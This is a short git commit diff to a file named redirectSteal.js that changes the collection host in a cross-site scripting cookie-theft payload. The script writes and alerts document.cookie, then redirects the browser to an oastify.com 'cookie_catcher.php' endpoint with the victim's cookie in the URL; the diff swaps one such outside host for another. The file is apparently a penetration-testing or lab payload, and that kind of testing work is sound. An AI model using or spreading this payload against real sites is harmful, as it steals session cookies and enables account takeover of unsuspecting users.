2f941fdd3bed535dbdef4c0cd7d700b47fbbf0e6
justblock6 <77896962+justblock6@users.noreply.github.com>
2023-04-11 15:54:21 -0700

    Update redirectSteal.js

--- redirectSteal.js
+++ redirectSteal.js
@@ -1,3 +1,3 @@
 document.write (document.cookie);
 alert (document.cookie);
-document.location= "https://edvh2z8mglccrdyoj590ietq0h69u0ip.oastify.com/cookie_catcher.php?c=" + document.cookie;
+document.location= "https://a5gduv0i8h48j9qkb11waalmsdy6mwal.oastify.com/cookie_catcher.php?c=" + document.cookie;
